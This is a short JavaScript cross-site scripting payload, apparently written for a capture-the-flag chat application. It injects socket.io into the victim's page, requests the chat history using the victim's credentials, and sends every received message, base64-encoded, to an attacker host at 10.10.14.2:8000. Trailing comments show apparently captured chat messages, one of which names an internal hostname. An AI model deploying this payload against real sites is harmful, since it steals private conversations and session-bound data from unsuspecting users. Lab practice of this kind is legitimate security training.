let e = document.createElement('script');
e.setAttribute("src", "/socket.io/socket.io.js");
document.head.appendChild(e);

setTimeout(() => {
  let value2 = "history";
  const res2 = axios.get(`/user/api/chat`);
  const socket2 = io('/', { withCredentials: true });

  socket2.emit('client_message', value2)

  //listening for the messages
  socket2.on('message', (my_message) => {

    //console.log("Received From Server: " + my_message)
    fetch('http://10.10.14.2:8000/' + btoa(encodeURIComponent(my_message)), { 'mode': 'no-cors' })

  })
}, 3000);

// Write a script to automate the auto-update
// Hello%2C I am Admin.Testing the Chat Application
// Write a script for  dev-git-auto-update.chatbot.htb to work properly
// A user has disconnected